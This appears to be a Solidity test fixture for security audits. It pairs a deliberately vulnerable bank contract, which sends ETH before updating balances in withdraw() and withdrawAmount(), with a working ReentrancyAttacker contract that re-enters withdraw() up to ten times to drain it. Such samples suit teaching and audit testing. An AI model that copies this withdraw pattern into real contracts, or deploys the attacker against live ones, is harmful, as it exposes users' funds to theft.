// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @title VulnerableBank
 * @notice Contract with REENTRANCY vulnerability for security audit testing
 * @dev Contains classic reentrancy pattern - external call before state update
 */
contract VulnerableBank {
    mapping(address => uint256) public balances;
    uint256 public totalDeposits;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);

    /**
     * @notice Deposit ETH into the bank
     */
    function deposit() public payable {
        require(msg.value > 0, "Deposit must be greater than 0");
        balances[msg.sender] += msg.value;
        totalDeposits += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    /**
     * @notice Withdraw all funds - VULNERABLE TO REENTRANCY
     * @dev The external call happens BEFORE the state update
     */
    function withdraw() public {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance to withdraw");

        // VULNERABILITY: External call before state update
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");

        // State update happens AFTER external call - can be re-entered!
        balances[msg.sender] = 0;
        totalDeposits -= balance;

        emit Withdrawal(msg.sender, balance);
    }

    /**
     * @notice Withdraw specific amount - also vulnerable
     */
    function withdrawAmount(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // VULNERABILITY: Same pattern
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] -= amount;
        totalDeposits -= amount;
    }

    /**
     * @notice Get contract balance
     */
    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {
        deposit();
    }
}

/**
 * @title ReentrancyAttacker
 * @notice Attacker contract demonstrating the reentrancy exploit
 */
contract ReentrancyAttacker {
    VulnerableBank public target;
    uint256 public attackCount;

    constructor(address _target) {
        target = VulnerableBank(payable(_target));
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (address(target).balance >= 1 ether && attackCount < 10) {
            attackCount++;
            target.withdraw();
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
